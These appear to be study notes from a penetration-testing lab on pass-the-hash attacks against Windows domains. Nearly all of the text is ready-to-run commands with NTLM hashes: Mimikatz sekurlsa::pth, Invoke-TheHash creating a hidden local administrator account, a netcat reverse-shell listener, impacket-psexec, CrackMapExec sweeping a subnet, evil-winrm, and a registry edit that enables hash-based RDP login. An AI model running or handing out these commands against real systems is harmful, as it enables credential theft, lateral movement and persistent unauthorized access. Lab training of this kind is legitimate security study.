
- Dumping the local SAM database from a compromised host
- Extracting hashes from the NTDS database (ntds.dit) on a Domain Controller
- Pulling the hashes from memory (lsass.exe)

NTLM (Network Technology LAN Manager)
- SSO
- Predecessor of Kerberos
- Password stored are not salted

#### Mimikatz (Windows)
```cmd-session
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```
- /rc4 = NTLM hash

#### Invoke-TheHash with SMB
https://github.com/Kevin-Robertson/Invoke-TheHash
```powershell-session
cd C:\tools\Invoke-TheHash\
```
```powershell-session
Import-Module .\Invoke-TheHash.psd1
```
```powershell-session
Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```

Reverse shell
Listen on host
```powershell-session
.\nc.exe -lvnp 8001
```

Reverse Shell Generator:
https://www.revshells.com/

```powershell-session
Import-Module .\Invoke-TheHash.psd1
```
```powershell-session
Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "Reverse shell script goes here"
```


#### Pass the Hash with Impacket (Linux)

```shell-session
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```
- https://github.com/fortra/impacket/blob/master/examples/wmiexec.py
- https://github.com/fortra/impacket/blob/master/examples/atexec.py
- https://github.com/fortra/impacket/blob/master/examples/smbexec.py

#### Pass the Hash with CrackMapExec (Linux)
```shell-session
crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
```

Command with -x flag
```shell-session
crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```

#### Pass the Hash with evil-winrm (Linux)
```shell-session
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```

#### Pass the Hash with RDP (Linux)
(DisableRestrictedAdmin must be enabled)
```cmd-session
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```
```shell-session
xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```


